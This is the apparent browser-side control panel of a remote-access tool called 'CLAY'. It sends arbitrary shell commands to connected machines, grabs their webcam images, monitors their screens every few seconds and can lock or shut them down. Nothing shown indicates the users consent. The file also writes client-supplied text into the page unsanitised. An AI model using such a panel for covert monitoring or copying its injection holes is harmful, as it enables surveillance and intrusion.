// 初始化Socket.IO连接
const socket = io();

// DOM元素引用 (新增屏幕截图相关元素)
const mediaContainer = document.getElementById('media-container');
const mediaClientIdSpan = document.getElementById('media-client-id');
const screenImage = document.getElementById('screen-image');
const screenLoading = document.getElementById('screen-loading');
const screenLoadingText = document.getElementById('screen-loading-text');
const screenQualitySelect = document.getElementById('screen-quality');
const screenZoomLevelSpan = document.getElementById('screen-zoom-level');
const webcamZoomLevelSpan = document.getElementById('webcam-zoom-level');

// 状态变量 (新增媒体面板相关变量)
let currentMediaClientId = null; // 当前媒体监控客户端ID
let screenZoomLevel = 100; // 屏幕截图缩放级别
let currentScreenQuality = 100; // 默认屏幕截图质量
let currentFullscreenType = null; // 当前全屏显示的图像类型（webcam或screen）
let isScreenMonitoring = false; // 是否正在循环获取屏幕截图
let screenMonitorInterval = null; // 屏幕监控的定时器ID

// 原有变量保留
const sidebar = document.getElementById('sidebar');
const clientList = document.getElementById('client-list');
const noClientsLi = document.getElementById('no-clients');
const clientCount = document.getElementById('client-count');
const statusDot = document.getElementById('status-dot');
const connectionStatus = document.getElementById('connection-status');
const serverTime = document.getElementById('server-time');
const mobileToggle = document.getElementById('mobile-toggle');

const welcomeMessage = document.getElementById('welcome-message');
const terminalContainer = document.getElementById('terminal-container');
const terminalOutput = document.getElementById('terminal-output');
const terminalClientIdSpan = document.getElementById('terminal-client-id');
const terminalInput = document.getElementById('terminal-input');
const sendCommandBtn = document.getElementById('send-command-btn');

const webcamContainer = document.getElementById('webcam-container');
const webcamClientIdSpan = document.getElementById('webcam-client-id');
const webcamImage = document.getElementById('webcam-image');
const webcamLoading = document.getElementById('webcam-loading');
const webcamLoadingText = document.getElementById('webcam-loading-text');
const webcamControls = document.getElementById('webcam-controls');

// 状态变量 (保留原有并新增)
let currentTerminalClientId = null;
let currentWebcamClientId = null;
let activeClients = {};
let commandHistory = [];
let historyPosition = -1;
let isCommandSuggestionsVisible = false;
let webcamZoomLevel = 100;
const webcamZoomStep = 25;
const screenZoomStep = 25;
let currentWorkingDirectory = '';


// 显示通知 (保持原有)
function showNotification(message, type = 'info') {
    console.log(`[${type}]`, message);

    const toast = document.createElement('div');
    toast.className = `toast align-items-center border-0 ${type === 'danger' ? 'bg-danger' : type === 'success' ? 'bg-success' : 'bg-primary'}`;
    toast.setAttribute('role', 'alert');
    toast.setAttribute('aria-live', 'assertive');
    toast.setAttribute('aria-atomic', 'true');

    toast.innerHTML = `
        <div class="d-flex">
            <div class="toast-body text-white">
                ${message}
            </div>
            <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
        </div>
    `;

    document.querySelector('.toast-container').appendChild(toast);
    const bsToast = new bootstrap.Toast(toast, { delay: 3000 });
    bsToast.show();

    toast.addEventListener('hidden.bs.toast', () => {
        toast.remove();
    });
}


// 更新连接状态 (保持原有)
function updateConnectionStatus(status) {
    statusDot.className = 'status-indicator';

    if (status === 'connected') {
        statusDot.classList.add('status-connected');
        connectionStatus.textContent = '已连接';
    } else if (status === 'disconnected') {
        statusDot.classList.add('status-disconnected');
        connectionStatus.textContent = '已断开连接';
    } else if (status === 'connecting') {
        statusDot.classList.add('status-connecting');
        connectionStatus.textContent = '正在连接...';
    } else if (status === 'error') {
        statusDot.classList.add('status-disconnected');
        connectionStatus.textContent = '连接错误';
    }
}


// 更新服务器时间 (保持原有)
function updateServerTime() {
    const now = new Date();
    serverTime.textContent = now.toLocaleTimeString();
}


// 更新客户端列表 (修改客户端按钮事件)
function updateClientList(clients) {
    clientList.innerHTML = '';
    activeClients = {};

    if (clients.length === 0) {
        clientList.appendChild(noClientsLi);
        clientCount.textContent = '0';
    } else {
        clientCount.textContent = clients.length.toString();

        clients.forEach(client => {
            activeClients[client.id] = client;

            const li = document.createElement('li');
            li.className = 'client-item';
            li.dataset.clientId = client.id;

            // 高亮当前选中客户端
            if (client.id === currentTerminalClientId || client.id === currentMediaClientId) {
                li.classList.add('active');
            }

            li.innerHTML = `
                <div class="client-info">
                    <div><strong>${client.hostname || '未知主机'}</strong></div>
                    <small>${client.os || '未知系统'} | ${client.address || '未知IP'}</small>
                </div>
                <div class="command-buttons mt-2">
                    <button class="btn btn-sm btn-primary terminal-btn" title="远程终端">终端</button>
                    <button class="btn btn-sm btn-info media-btn" title="媒体监控">媒体</button>
                    <button class="btn btn-sm btn-warning lock-btn" title="锁屏">锁屏</button>
                    <button class="btn btn-sm btn-danger shutdown-btn" title="关机">关机</button>
                </div>
            `;

            // 绑定事件 (修改为媒体监控按钮)
            li.querySelector('.terminal-btn').addEventListener('click', (e) => {
                e.stopPropagation();
                openTerminal(client.id);
            });

            li.querySelector('.media-btn').addEventListener('click', (e) => {
                e.stopPropagation();
                showMediaMonitor(client.id);
            });

            li.querySelector('.lock-btn').addEventListener('click', (e) => {
                e.stopPropagation();
                sendSimpleCommand(client.id, 'lock');
            });

            li.querySelector('.shutdown-btn').addEventListener('click', (e) => {
                e.stopPropagation();
                if (confirm(`确定要关闭 ${client.hostname || client.id} 吗?`)) {
                    sendSimpleCommand(client.id, 'shutdown');
                }
            });

            clientList.appendChild(li);
        });
    }

    // 客户端断开连接处理
    if (currentTerminalClientId && !clients.some(c => c.id === currentTerminalClientId)) {
        closeTerminal();
        showNotification(`客户端 ${currentTerminalClientId} 已断开连接`, 'danger');
    }

    if (currentMediaClientId && !clients.some(c => c.id === currentMediaClientId)) {
        // 如果正在屏幕监控，先停止监控
        if (isScreenMonitoring) {
            stopScreenMonitor();
            showNotification(`客户端 ${currentMediaClientId} 已断开连接，屏幕监控已停止`, 'warning');
        }
        closeMediaPanel();
        showNotification(`客户端 ${currentMediaClientId} 已断开连接`, 'danger');
    }
}


// 切换到媒体监控面板 (新增)
function showMediaMonitor(clientId) {
    const client = activeClients[clientId];
    if (!client) return;

    currentMediaClientId = clientId;
    mediaClientIdSpan.textContent = client.hostname || clientId;

    // 重置状态
    resetMediaPanel();

    // 显示面板
    welcomeMessage.classList.add('d-none');
    terminalContainer.classList.add('d-none');
    mediaContainer.classList.remove('d-none');

    // 高亮选中客户端
    highlightSelectedClient();
    closeMobileMenu();

    // 不再自动加载媒体内容，需要用户手动点击按钮获取
}


// 重置媒体面板状态 (新增)
function resetMediaPanel() {
    // 重置摄像头
    webcamImage.classList.add('d-none');
    webcamLoading.classList.remove('d-none');
    webcamLoadingText.textContent = '请点击「获取当前摄像」按钮获取摄像头画面';
    webcamZoomLevel = 100;
    webcamZoomLevelSpan.textContent = '100%';

    // 重置屏幕截图
    screenImage.classList.add('d-none');
    screenLoading.classList.remove('d-none');
    screenLoadingText.textContent = '请点击「获取当前屏幕」按钮获取截图';
    screenZoomLevel = 100;
    screenZoomLevelSpan.textContent = '100%';
    currentScreenQuality = parseInt(screenQualitySelect.value);
}


// 获取当前屏幕截图 (新增)
function captureCurrentScreen() {
    if (!currentMediaClientId) return;

    // 更新UI状态
    screenImage.classList.add('d-none');
    screenLoading.classList.remove('d-none');
    screenLoadingText.textContent = '正在获取屏幕截图...';

    // 发送截图命令
    socket.emit('execute_command', {
        client_id: currentMediaClientId,
        command: `clay screen capture ${currentScreenQuality}`
    });
}


// 刷新摄像头 (修改适配媒体面板)
function refreshWebcam() {
    if (currentMediaClientId) {
        webcamImage.classList.add('d-none');
        webcamLoading.classList.remove('d-none');
        webcamLoadingText.textContent = '正在获取摄像头画面...';

        socket.emit('execute_command', {
            client_id: currentMediaClientId,
            command: 'capture_webcam'
        });
    }
}


// 刷新所有媒体内容 (新增)
function refreshAllMedia() {
    // 如果正在屏幕监控，先停止之前的监控
    if (isScreenMonitoring) {
        stopScreenMonitor();
    }
    refreshWebcam();
    captureCurrentScreen();
}


// 关闭媒体监控面板 (新增)
function closeMediaPanel() {
    // 如果正在屏幕监控，先停止
    if (isScreenMonitoring) {
        stopScreenMonitor();
    }

    currentMediaClientId = null;
    mediaContainer.classList.add('d-none');

    // 显示欢迎页
    if (terminalContainer.classList.contains('d-none')) {
        welcomeMessage.classList.remove('d-none');
    }

    highlightSelectedClient();
}


// 设置屏幕截图质量 (新增)
function setScreenQuality() {
    const quality = parseInt(screenQualitySelect.value);
    if (quality >= 60 && quality <= 100) {
        currentScreenQuality = quality;
        showNotification(`屏幕截图质量已设置为 ${quality}%`, 'info');

        // 添加高亮动画效果
        screenQualitySelect.classList.add('quality-highlight');
        setTimeout(() => {
            screenQualitySelect.classList.remove('quality-highlight');
        }, 1000);

        // 立即应用新质量重新截图
        if (currentMediaClientId) {
            captureCurrentScreen();
        }
    }
}


// 屏幕截图缩放控制 (修改)
function zoomScreen(action) {
    if (!screenImage.classList.contains('d-none')) {
        if (action === 'in') {
            screenZoomLevel = Math.min(200, screenZoomLevel + screenZoomStep);
        } else if (action === 'out') {
            screenZoomLevel = Math.max(50, screenZoomLevel - screenZoomStep);
        } else {
            screenZoomLevel = 100;
        }

        // 应用缩放 - 使用transform:scale代替width
        screenImage.style.transform = `scale(${screenZoomLevel/100})`;
        screenImage.style.transformOrigin = 'center center';
        screenZoomLevelSpan.textContent = `${screenZoomLevel}%`;
    }
}


// 摄像头缩放控制 (修改适配媒体面板)
function zoomWebcam(action) {
    if (!webcamImage.classList.contains('d-none')) {
        if (action === 'in') {
            webcamZoomLevel = Math.min(200, webcamZoomLevel + webcamZoomStep);
        } else if (action === 'out') {
            webcamZoomLevel = Math.max(50, webcamZoomLevel - webcamZoomStep);
        } else {
            webcamZoomLevel = 100;
        }

        // 应用缩放 - 使用transform:scale代替width
        webcamImage.style.transform = `scale(${webcamZoomLevel/100})`;
        webcamImage.style.transformOrigin = 'center center';
        webcamZoomLevelSpan.textContent = `${webcamZoomLevel}%`;
    }
}


// 切换全屏显示
function toggleFullscreen(type) {
    const image = type === 'webcam' ? webcamImage : screenImage;
    const fullscreenBtn = type === 'webcam' ? document.getElementById('webcam-fullscreen') : document.getElementById('screen-fullscreen');
    const zoomLevel = type === 'webcam' ? webcamZoomLevel : screenZoomLevel;

    if (!image.classList.contains('d-none')) {
        if (!document.fullscreenElement) {
            // 进入全屏模式前应用当前缩放级别
            image.style.transform = `scale(${zoomLevel/100})`;

            // 进入全屏模式
            if (image.requestFullscreen) {
                image.requestFullscreen();
            } else if (image.webkitRequestFullscreen) { /* Safari */
                image.webkitRequestFullscreen();
            } else if (image.msRequestFullscreen) { /* IE11 */
                image.msRequestFullscreen();
            }

            // 更新按钮图标
            fullscreenBtn.innerHTML = '<i class="fas fa-compress"></i>';
            fullscreenBtn.title = '退出全屏';

            // 保存当前全屏的图像类型
            currentFullscreenType = type;

            // 显示通知
            showNotification(`已进入${type === 'webcam' ? '摄像头' : '屏幕截图'}全屏模式，按ESC或双击图像退出`, 'info');
        } else {
            // 退出全屏模式
            exitFullscreen();
        }
    }
}

// 处理全屏状态变化
function handleFullscreenChange() {
    if (!document.fullscreenElement &&
        !document.webkitFullscreenElement &&
        !document.mozFullScreenElement &&
        !document.msFullscreenElement) {

        // 已退出全屏模式，更新按钮图标
        if (currentFullscreenType === 'webcam') {
            const fullscreenBtn = document.getElementById('webcam-fullscreen');
            fullscreenBtn.innerHTML = '<i class="fas fa-expand"></i>';
            fullscreenBtn.title = '全屏';
        } else if (currentFullscreenType === 'screen') {
            const fullscreenBtn = document.getElementById('screen-fullscreen');
            fullscreenBtn.innerHTML = '<i class="fas fa-expand"></i>';
            fullscreenBtn.title = '全屏';
        }

        // 重置当前全屏类型
        currentFullscreenType = null;
    }
}

// 退出全屏模式的通用函数
function exitFullscreen() {
    if (document.exitFullscreen) {
        document.exitFullscreen();
    } else if (document.webkitExitFullscreen) {
        document.webkitExitFullscreen();
    } else if (document.mozCancelFullScreen) {
        document.mozCancelFullScreen();
    } else if (document.msExitFullscreen) {
        document.msExitFullscreen();
    }
}

// 处理全屏模式下的键盘事件
document.addEventListener('keydown', (e) => {
    if (document.fullscreenElement && currentFullscreenType) {
        // 按ESC键退出全屏（浏览器默认行为）

        // 按+键放大
        if (e.key === '+' || e.key === '=') {
            e.preventDefault();
            if (currentFullscreenType === 'webcam') {
                zoomWebcam('in');
            } else if (currentFullscreenType === 'screen') {
                zoomScreen('in');
            }
        }

        // 按-键缩小
        else if (e.key === '-' || e.key === '_') {
            e.preventDefault();
            if (currentFullscreenType === 'webcam') {
                zoomWebcam('out');
            } else if (currentFullscreenType === 'screen') {
                zoomScreen('out');
            }
        }

        // 按0键重置缩放
        else if (e.key === '0') {
            e.preventDefault();
            if (currentFullscreenType === 'webcam') {
                zoomWebcam('reset');
            } else if (currentFullscreenType === 'screen') {
                zoomScreen('reset');
            }
        }
    }
});


// 打开终端 (保持原有)
function openTerminal(clientId) {
    const client = activeClients[clientId];
    if (!client) return;

    currentTerminalClientId = clientId;
    terminalClientIdSpan.textContent = client.hostname || clientId;
    terminalOutput.textContent = '';
    terminalInput.value = '';

    welcomeMessage.classList.add('d-none');
    mediaContainer.classList.add('d-none');
    terminalContainer.classList.remove('d-none');

    highlightSelectedClient();
    closeMobileMenu();
    terminalInput.focus();
}


// 发送终端命令 (保持原有，新增屏幕命令适配)
function sendTerminalCommand() {
    if (!currentTerminalClientId) {
        showNotification("请先选择一个客户端", "danger");
        return;
    }

    let commandText = terminalInput.value.trim();
    if (!commandText) return;

    // 修复PowerShell命令格式
    commandText = fixPowerShellCommand(commandText);

    // 发送命令
    socket.emit('execute_command', {
        client_id: currentTerminalClientId,
        command: commandText
    });

    // 显示命令输入
    terminalOutput.textContent += `$ ${commandText}\n`;
    terminalOutput.scrollTop = terminalOutput.scrollHeight;

    // 添加历史记录
    addToCommandHistory(commandText);
    terminalInput.value = '';

    // 隐藏建议
    const suggestionDiv = document.querySelector('.command-history');
    if (suggestionDiv) suggestionDiv.style.display = 'none';
}


// 关闭终端 (保持原有)
function closeTerminal() {
    currentTerminalClientId = null;
    terminalContainer.classList.add('d-none');

    if (mediaContainer.classList.contains('d-none')) {
        welcomeMessage.classList.remove('d-none');
    }

    highlightSelectedClient();
}


// 清空终端 (保持原有)
function clearTerminal() {
    if (currentTerminalClientId) {
        terminalOutput.textContent = '';
        showNotification('终端输出已清空', 'info');
    }
}


// 发送简单命令 (保持原有)
function sendSimpleCommand(clientId, command) {
    const client = activeClients[clientId];
    if (!client) return;

    socket.emit('execute_command', {
        client_id: clientId,
        command: command
    });

    const commandName = command === 'lock' ? '锁屏' : '关机';
    showNotification(`已向 ${client.hostname || clientId} 发送${commandName}命令`, 'info');
}


// 高亮选中客户端 (修改适配媒体面板)
function highlightSelectedClient() {
    document.querySelectorAll('.client-item').forEach(item => {
        item.classList.remove('active');
    });

    if (currentTerminalClientId) {
        const item = document.querySelector(`.client-item[data-client-id="${currentTerminalClientId}"]`);
        if (item) item.classList.add('active');
    }

    if (currentMediaClientId && currentMediaClientId !== currentTerminalClientId) {
        const item = document.querySelector(`.client-item[data-client-id="${currentMediaClientId}"]`);
        if (item) item.classList.add('active');
    }
}


// 移动设备菜单切换 (保持原有)
function toggleMobileMenu() {
    sidebar.classList.toggle('show');
}

function closeMobileMenu() {
    sidebar.classList.remove('show');
}


// Socket.IO事件处理 (新增屏幕截图事件)
socket.on('connect', () => {
    updateConnectionStatus('connected');
    socket.emit('get_clients');
});

socket.on('disconnect', () => {
    updateConnectionStatus('disconnected');
    updateClientList([]);

    // 如果正在屏幕监控，停止监控
    if (isScreenMonitoring) {
        stopScreenMonitor();
    }
});

socket.on('connect_error', () => {
    updateConnectionStatus('error');
});

socket.on('update_client_list', (clients) => {
    updateClientList(clients);
});

socket.on('terminal_output', (data) => {
    console.log('收到终端输出:', data);
    if (data.client_id === currentTerminalClientId) {
        let formattedOutput = formatTerminalOutput(data.output);

        if (formattedOutput.isHTML) {
            const tempDiv = document.createElement('div');
            tempDiv.innerHTML = formattedOutput.text;
            terminalOutput.appendChild(tempDiv);
        } else {
            terminalOutput.textContent += formattedOutput.text;
        }

        terminalOutput.scrollTop = terminalOutput.scrollHeight;
    }
});

socket.on('webcam_frame', (data) => {
    // 仅处理当前媒体客户端的摄像头数据
    if (data.client_id === currentMediaClientId) {
        webcamImage.src = `data:image/jpeg;base64,${data.image_data}`;
        webcamImage.classList.remove('d-none');
        webcamLoading.classList.add('d-none');
        // 应用当前缩放级别
        webcamImage.style.transform = `scale(${webcamZoomLevel/100})`;
        webcamImage.style.transformOrigin = 'center center';
    }
});

// 屏幕截图帧处理事件
socket.on('screen_frame', (data) => {
    if (data.client_id === currentMediaClientId) {
        screenImage.src = `data:image/jpeg;base64,${data.image_data}`;
        screenImage.classList.remove('d-none');
        screenLoading.classList.add('d-none');
        // 应用当前缩放级别
        screenImage.style.transform = `scale(${screenZoomLevel/100})`;
        screenImage.style.transformOrigin = 'center center';
    }
});


// 格式化终端输出 (保持原有)
function formatTerminalOutput(text) {
    if (text.includes('[CLAY]')) {
        let html = text
            .replace(/\[CLAY\] 🚀 执行命令: (.*)/g, '<div class="clay-command">[CLAY] 🚀 执行命令: $1</div>')
            .replace(/\[CLAY\] ✅ (.*)/g, '<div class="clay-success">[CLAY] ✅ $1</div>')
            .replace(/\[CLAY\] ❌ (.*)/g, '<div class="clay-error">[CLAY] ❌ $1</div>')
            .replace(/\[CLAY\] ⚠️ (.*)/g, '<div class="clay-warning">[CLAY] ⚠️ $1</div>')
            .replace(/\[CLAY\] 🛑 (.*)/g, '<div class="clay-error">[CLAY] 🛑 $1</div>')
            .replace(/\[CLAY\] ⏱️ (.*)/g, '<div class="clay-warning">[CLAY] ⏱️ $1</div>')
            .replace(/----+/g, '<div class="separator"></div>');

        return { text: html, isHTML: true };
    }

    return { text: text, isHTML: false };
}


// 修复PowerShell命令格式 (保持原有)
function fixPowerShellCommand(command) {
    if (command.toLowerCase().startsWith('powershell')) {
        if (command.includes('|') || command.includes('{') || command.includes('$') || command.includes('>')) {
            if (!command.includes('-Command')) {
                const psCommand = command.substring('powershell'.length).trim();
                return `powershell -Command "${psCommand.replace(/"/g, '\\"')}"`;
            }
        }
    }
    return command;
}


function navigateCommandHistory(direction) {
    if (commandHistory.length === 0) return;

    historyPosition = direction === 'up'
        ? Math.max(0, historyPosition - 1)
        : Math.min(commandHistory.length, historyPosition + 1);

    terminalInput.value = historyPosition === commandHistory.length
        ? ''
        : commandHistory[historyPosition];
}

function showCommandSuggestion(input) {
    const suggestions = {
        'c': ['cd', 'cls', 'copy', 'clay help', 'clay info', 'clay screen capture'],
        'd': ['dir', 'del', 'date', 'diskpart'],
        'i': ['ipconfig', 'ipconfig /all', 'ipconfig /flushdns'],
        'n': ['netstat', 'netstat -an', 'nslookup', 'net user'],
        'p': ['ping', 'powershell', 'pathping'],
        't': ['tasklist', 'tracert', 'type', 'time'],
        'w': ['whoami', 'wmic', 'wmic process list']
    };

    const firstChar = input.charAt(0).toLowerCase();
    if (suggestions[firstChar] && input.length === 1) {
        const suggestionHTML = suggestions[firstChar].map(cmd =>
            `<div class="history-item">${cmd}</div>`).join('');

        let suggestionDiv = document.querySelector('.command-history');
        if (!suggestionDiv) {
            suggestionDiv = document.createElement('div');
            suggestionDiv.className = 'command-history';
            document.querySelector('.terminal-input-group').appendChild(suggestionDiv);
        }

        suggestionDiv.innerHTML = suggestionHTML;
        suggestionDiv.style.display = 'block';

        suggestionDiv.querySelectorAll('.history-item').forEach(item => {
            item.addEventListener('click', () => {
                terminalInput.value = item.textContent;
                suggestionDiv.style.display = 'none';
                terminalInput.focus();
            });
        });
    } else {
        const suggestionDiv = document.querySelector('.command-history');
        if (suggestionDiv) suggestionDiv.style.display = 'none';
    }
}


// 初始化 (新增媒体面板事件绑定)
document.addEventListener('DOMContentLoaded', () => {
    // 时间更新
    updateServerTime();
    setInterval(updateServerTime, 1000);
    updateConnectionStatus('connecting');

    // 初始化屏幕质量选择框
    screenQualitySelect.value = currentScreenQuality.toString();

    // 终端事件绑定
    terminalInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') sendTerminalCommand();
    });
    sendCommandBtn.addEventListener('click', sendTerminalCommand);
    mobileToggle.addEventListener('click', toggleMobileMenu);

    // 加载命令历史
    try {
        const savedHistory = localStorage.getItem('terminal_history');
        if (savedHistory) commandHistory = JSON.parse(savedHistory);
        historyPosition = commandHistory.length;
    } catch(e) {
        console.error('加载命令历史出错:', e);
        commandHistory = [];
    }

    // 终端输入事件
    terminalInput.addEventListener('keydown', (e) => {
        if (e.key === 'ArrowUp') {
            e.preventDefault();
            navigateCommandHistory('up');
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            navigateCommandHistory('down');
        } else if (e.key === 'Tab') {
            e.preventDefault();
        }
    });

    terminalInput.addEventListener('input', () => {
        showCommandSuggestion(terminalInput.value);
    });

    document.addEventListener('click', (e) => {
        if (!e.target.closest('.terminal-input-group')) {
            const suggestionDiv = document.querySelector('.command-history');
            if (suggestionDiv) suggestionDiv.style.display = 'none';
        }
    });

    // 监听全屏状态变化
    document.addEventListener('fullscreenchange', handleFullscreenChange);
    document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
    document.addEventListener('mozfullscreenchange', handleFullscreenChange);
    document.addEventListener('MSFullscreenChange', handleFullscreenChange);

    // 添加全屏模式下的鼠标滚轮缩放
    document.addEventListener('wheel', (e) => {
        if (document.fullscreenElement) {
            e.preventDefault();
            if (currentFullscreenType === 'webcam') {
                zoomWebcam(e.deltaY < 0 ? 'in' : 'out');
            } else if (currentFullscreenType === 'screen') {
                zoomScreen(e.deltaY < 0 ? 'in' : 'out');
            }
        }
    }, { passive: false });

    // 添加双击退出全屏功能
webcamImage.addEventListener('dblclick', () => {
    if (document.fullscreenElement && currentFullscreenType === 'webcam') {
        exitFullscreen();
    }
});

screenImage.addEventListener('dblclick', () => {
    if (document.fullscreenElement && currentFullscreenType === 'screen') {
        exitFullscreen();
    }
});

    // 媒体面板事件绑定 (新增)
    document.getElementById('refresh-all-media').addEventListener('click', refreshAllMedia);
    document.getElementById('capture-screen-btn').addEventListener('click', captureCurrentScreen);
    document.getElementById('refresh-webcam-btn').addEventListener('click', refreshWebcam);
    document.getElementById('close-media-btn').addEventListener('click', closeMediaPanel);
    screenQualitySelect.addEventListener('change', setScreenQuality);

    // 屏幕缩放事件 (新增)
    document.getElementById('screen-zoom-in').addEventListener('click', () => zoomScreen('in'));
    document.getElementById('screen-zoom-out').addEventListener('click', () => zoomScreen('out'));
    document.getElementById('screen-zoom-reset').addEventListener('click', () => zoomScreen('reset'));

    // 摄像头缩放事件 (修改)
    document.getElementById('webcam-zoom-in').addEventListener('click', () => zoomWebcam('in'));
    document.getElementById('webcam-zoom-out').addEventListener('click', () => zoomWebcam('out'));
    document.getElementById('webcam-zoom-reset').addEventListener('click', () => zoomWebcam('reset'));

    // 初始化命令建议
    initializeCommandSuggestions();
});


// 初始化命令建议 (保持原有)
function initializeCommandSuggestions() {
    document.querySelectorAll('.cmd-btn').forEach(button => {
        button.addEventListener('click', function() {
            const cmd = this.getAttribute('data-cmd');
            terminalInput.value = cmd;
            terminalInput.focus();
        });
    });
}


// 中断命令执行 (保持原有)
function interruptCommand() {
    if (!currentTerminalClientId) {
        showNotification("没有选择客户端", "warning");
        return;
    }

    showNotification("发送中断信号...", "info");
    socket.emit('interrupt_command', { client_id: currentTerminalClientId });
    terminalOutput.textContent += "\n[CLAY] ⚠️ 已发送中断信号，正在尝试停止命令...\n";
    terminalOutput.scrollTop = terminalOutput.scrollHeight;
}
// 切换常用命令面板显示/隐藏
function toggleCommandSuggestions() {
    const suggestionsPanel = document.getElementById('command-suggestions');
    isCommandSuggestionsVisible = !isCommandSuggestionsVisible;

    if (isCommandSuggestionsVisible) {
        suggestionsPanel.classList.remove('d-none');
    } else {
        suggestionsPanel.classList.add('d-none');
    }
}


// 添加命令到历史记录
function addToCommandHistory(command) {
    // 不添加空命令或与最后一条命令相同的命令
    if (!command || (commandHistory.length > 0 && commandHistory[commandHistory.length - 1] === command)) {
        return;
    }

    // 限制历史记录大小
    if (commandHistory.length >= 50) {
        commandHistory.shift();
    }

    commandHistory.push(command);
    historyPosition = commandHistory.length;

    // 保存到本地存储
    localStorage.setItem('terminal_history', JSON.stringify(commandHistory));
}

// 切换屏幕监控状态
function toggleScreenMonitor() {
    if (!currentMediaClientId) {
        showNotification("请先选择一个客户端", "danger");
        return;
    }

    const toggleBtn = document.getElementById('toggle-screen-monitor-btn');

    if (!isScreenMonitoring) {
        // 开始屏幕监控
        isScreenMonitoring = true;
        toggleBtn.innerHTML = '<i class="fas fa-stop"></i>停止监控';
        toggleBtn.classList.remove('btn-success');
        toggleBtn.classList.add('btn-danger');

        // 发送开始监控命令
        socket.emit('execute_command', {
            client_id: currentMediaClientId,
            command: 'clay screen on'
        });

        showNotification("已开始屏幕监控，每3秒自动获取一次屏幕截图", "info");

        // 设置定时获取屏幕截图
        screenMonitorInterval = setInterval(() => {
            if (currentMediaClientId && isScreenMonitoring) {
                captureCurrentScreen();
            } else {
                clearInterval(screenMonitorInterval);
            }
        }, 3000); // 每3秒获取一次
    } else {
        // 停止屏幕监控
        stopScreenMonitor();
    }
}

// 停止屏幕监控
function stopScreenMonitor() {
    if (screenMonitorInterval) {
        clearInterval(screenMonitorInterval);
        screenMonitorInterval = null;
    }

    isScreenMonitoring = false;

    const toggleBtn = document.getElementById('toggle-screen-monitor-btn');
    toggleBtn.innerHTML = '<i class="fas fa-play"></i>开始监控';
    toggleBtn.classList.remove('btn-danger');
    toggleBtn.classList.add('btn-success');

    // 发送停止监控命令
    if (currentMediaClientId) {
        socket.emit('execute_command', {
            client_id: currentMediaClientId,
            command: 'clay screen off'
        });

        showNotification("已停止屏幕监控", "info");
    }
}
